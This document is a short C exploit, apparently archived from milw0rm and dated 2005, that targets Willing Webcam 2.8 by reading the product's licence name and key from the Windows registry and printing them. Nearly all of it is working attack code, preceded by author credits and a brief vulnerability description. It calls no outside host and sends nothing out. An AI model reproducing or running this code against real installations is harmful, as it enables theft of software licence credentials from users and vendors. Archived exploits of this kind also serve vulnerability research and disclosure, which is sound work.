/*****************************************************************

Willing Webcam 2.8 licence info disclosure local exploit by Kozan

Application: Willing Webcam 2.8 (and probably prior versions)
Vendor: Willing Software - www.willingsoftware.com
Vulnerable Description: Willing Webcam 2.8 discloses licence
informations (username and key) to local users.

Discovered & Coded by: Kozan
Credits to ATmaCA
Web: www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com

*****************************************************************/

#include <stdio.h>
#include <windows.h>
#define BUF 100

int main()
{

       HKEY hKey;
       char Name[BUF], Key[BUF];
       DWORD dwBUFLEN = BUF;
       LONG lRet;

       if( RegOpenKeyEx(HKEY_CURRENT_USER,
                                        "Software\\Willing Software\\Willing WebCam",
                                        0,
                                        KEY_QUERY_VALUE,
                                        &hKey ) == ERROR_SUCCESS )
       {
               lRet = RegQueryValueEx(hKey, "Name", NULL, NULL, (LPBYTE)Name, &dwBUFLEN);
               if (lRet != ERROR_SUCCESS || dwBUFLEN > BUF) strcpy(Name,"Not Found!");

               lRet = RegQueryValueEx(hKey, "Key", NULL, NULL, (LPBYTE)Key, &dwBUFLEN);
               if (lRet != ERROR_SUCCESS || dwBUFLEN > BUF) strcpy(Key,"Not Found!");

               RegCloseKey(hKey);

               printf("Willing Webcam 2.8 Local Exploit by Kozan\n");
               printf("Credits to ATmaCA\n");
               printf("www.netmagister.com - www.spyinstructors.com \n");
               printf("kozan@netmagister.com\n\n");
               printf("Licence Name : %8s\n",Name);
               printf("Licence Key  : %8s\n",Key);
       }
       else
       {
               printf("Willing Webcam 2.8 is not installed on your system!\n");
       }
       return 0;
}

// milw0rm.com [2005-07-04]
